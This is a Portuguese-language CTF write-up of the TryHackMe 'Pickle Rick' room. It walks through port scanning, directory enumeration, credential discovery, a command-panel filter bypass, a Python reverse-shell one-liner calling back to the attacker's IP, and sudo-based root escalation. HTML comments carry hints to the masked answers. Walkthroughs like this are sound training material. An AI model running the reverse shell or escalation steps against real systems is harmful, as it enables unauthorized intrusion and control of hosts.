---
title: TryHackMe - Pickle Rick
description: Rick e Morty CTF. Ajude a transformar Rick de volta em um humano!
author: c3n0r4
categories: [Challenges, Linux]
tags: [CTF-Fácil, nmap, gobuster, reverse-shell, privilege-escalation]
media_subpath: /assets/images/picklerick
image:
  path: capa.webp
  alt: Rick e Morty CTF. Ajude a transformar Rick de volta em um humano!
---

Este desafio com tema de **Rick and Morty** nos leva a explorar um servidor web em busca de **três ingredientes secretos** para ajudar Rick a preparar uma poção que o transforme novamente em humano, após ter virado um picles.

## Reconhecimento Inicial
### Varredura de Portas e Detecção de Serviços com Nmap
Comecei identificando os serviços ativos na máquina alvo usando o `nmap`com uma varredura completa de portas e detecção de serviços.

```sh
┌──(c3n0r4㉿kali)-[~/tryhackme/room/picklerick]
└─$ nmap -p- -sC -sV -n -Pn -T4 10.10.189.231                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 18:24 -03
Nmap scan report for 10.10.189.231
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 60:53:94:04:ed:ed:e4:8a:9c:05:2e:6c:ac:37:f8:15 (RSA)
|   256 f0:a3:f7:f1:be:81:3c:38:ce:12:2d:c4:92:f6:de:e6 (ECDSA)
|_  256 c2:39:e1:bb:72:28:cc:75:b1:9b:37:40:05:c3:a9:d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 464.72 seconds
```
- 22/tcp → OpenSSH 8.2p1
- 80/tcp → Apache 2.4.41
- OS: Linux

## Enumeração Web
### Análise do Serviço HTTP
Acessei o endereço e fui recebido por uma página temática de Rick and Morty.
![](pagina-inicial.webp)

Inspecionando o código-fonte, encontrei um comentário HTML que revela um nome de usuário: <!-- R1ckRul3s -->

```html
  <!--
    Note to self, remember username! Username: THM{*********}
  -->
```

### Descoberta de Arquivos e Diretórios com GoBuster
Utilizamos o ´gobuster´ para descobrir arquivos e diretórios ocultos:
```sh
┌──(c3n0r4㉿kali)-[~/tryhackme/room/picklerick]
└─$ gobuster dir -u http://10.10.189.231 -e -w /usr/share/wordlists/quickhits.txt -t 100 -q
http://10.10.189.231/.ht_wsr.txt          (Status: 403) [Size: 278]
http://10.10.189.231/.hta                 (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess            (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess-dev        (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess-local      (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess-marco      (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.BAK        (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.bak        (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.bak1       (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.old        (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.save       (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess_orig       (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.orig       (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.sample     (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess.txt        (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess_extra      (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess_sc         (Status: 403) [Size: 278]
http://10.10.189.231/.htaccessOLD         (Status: 403) [Size: 278]
http://10.10.189.231/.htaccessBAK         (Status: 403) [Size: 278]
http://10.10.189.231/.htaccessOLD2        (Status: 403) [Size: 278]
http://10.10.189.231/.htaccess~           (Status: 403) [Size: 278]
http://10.10.189.231/.htgroup             (Status: 403) [Size: 278]
http://10.10.189.231/.htpasswd            (Status: 403) [Size: 278]
http://10.10.189.231/.htpasswd_test       (Status: 403) [Size: 278]
http://10.10.189.231/.htpasswd-old        (Status: 403) [Size: 278]
http://10.10.189.231/.htpasswds           (Status: 403) [Size: 278]
http://10.10.189.231/.htusers             (Status: 403) [Size: 278]
http://10.10.189.231/index.phps           (Status: 403) [Size: 278]
http://10.10.189.231/login.php            (Status: 200) [Size: 882]
http://10.10.189.231/robots.txt           (Status: 200) [Size: 17]
http://10.10.189.231/server-status/       (Status: 403) [Size: 278]
```
- /login.php
- /robots.txt

### login.php
A página `login.php` revela a seguinte interface:
![](pagina-login.webp)

### robots.txt <!-- Wubbalubbadubdub -->
O arquivo `robots.txt` contém uma string sugestiva, provavelmente a senha:
```html
THM{****************}
```
Com essas informações, fui para a tentativa de login.

## Exploração e Execução Remota
### Acesso via Painel de Comandos
Após logar, encontrei um painel com um campo para execução de comandos. Tentei listar arquivos e encontrei o **primeiro ingrediente:** <!-- mr. meeseek hair -->
![](painel-comando.webp)

Apesar do comando `cat` estar bloqueado, foi possível contornar usando `tac` para leitura de arquivo. <!-- tac -->
![](comando-desabilitado.webp)

```sh
tac Sup3rS3cretPickl3Ingred.txt
THM{*** ******* ****}
```

### Shell Reversa
O campo de entrada aceita comandos do sistema, permitindo execução remota (RCE). Utilizamos esse vetor para obter uma **reverse shell**:


``` bash
# kali (listener)
┌──(c3n0r4㉿kali)-[~/tryhackme/room/picklerick]
└─$ nc -lvnp 53 
listening on [any] 53 ...
```

```bash
# Target (payload)
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.6.47.63",53));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Consegui uma shell reversa como `www-data`.
```sh
connect to [10.6.47.63] from (UNKNOWN) [10.10.189.231] 52324
$ whoami
whoami
www-data
```

## Pós-Exploração
### PrivEsc  

Acessei a home do usuário `rick` e encontrei o **segundo ingrediente:** <!-- 1 jerry tear -->
``` sh
$ pwd
pwd
/var/www/html
$ cd /home      
cd /home
$ ls -larth
ls -larth
total 16K
drwxr-xr-x  4 root   root   4.0K Feb 10  2019 .
drwxrwxrwx  2 root   root   4.0K Feb 10  2019 rick
drwxr-xr-x  5 ubuntu ubuntu 4.0K Jul 11  2024 ubuntu
drwxr-xr-x 23 root   root   4.0K Jun 11 23:09 ..
$ cd rick
cd rick
$ ls -larth
ls -larth
total 12K
drwxr-xr-x 4 root root 4.0K Feb 10  2019  ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 'second ingredients'
drwxrwxrwx 2 root root 4.0K Feb 10  2019  .
$ cat 'second ingredients'
cat 'second ingredients'
THM{* ***** ****}
```

### Escalada de Privilégios
Ao verificar os privilégios com `sudo -l`, descobri que o usuário www-data pode executar qualquer comando como root sem precisar de senha.

``` sh
$ ls -larth /home/ubuntu
ls -larth /home/ubuntu
total 44K
-rw-r--r-- 1 ubuntu ubuntu 3.7K Aug 31  2015 .bashrc
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4.0K Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
drwxr-xr-x 4 root   root   4.0K Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu 4.2K Feb 10  2019 .viminfo
drwx------ 3 ubuntu ubuntu 4.0K Jul 11  2024 .gnupg
drwxr-xr-x 5 ubuntu ubuntu 4.0K Jul 11  2024 .
drwx------ 3 ubuntu ubuntu 4.0K Jul 11  2024 .cache
-rw------- 1 ubuntu ubuntu  769 Jul 11  2024 .bash_history
$ cat /home/ubuntu/.sudo_as_admin_sucessful
cat .sudo_as_admin_sucessful
$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-10-189-231:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-189-231:
    (ALL) NOPASSWD: ALL
$ sudo bash -i
sudo bash -i
```

Já como root, acessei o diretório `/root`, encontrei o **terceiro ingrediente:** <!-- fleeb juice -->
```bash
root@ip-10-10-189-231:/home/rick# cd /root
cd /root
root@ip-10-10-189-231:~# ls -larth
ls -larth
total 36K
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  2 root root 4.0K Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-------  1 root root  702 Jul 11  2024 .viminfo
drwx------  4 root root 4.0K Jul 11  2024 .
drwxr-xr-x  4 root root 4.0K Jul 11  2024 snap
drwxr-xr-x 23 root root 4.0K Jun 11 23:09 ..
-rw-------  1 root root  223 Jun 12 00:27 .bash_history
root@ip-10-10-189-231:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: THM{***** *****}
```
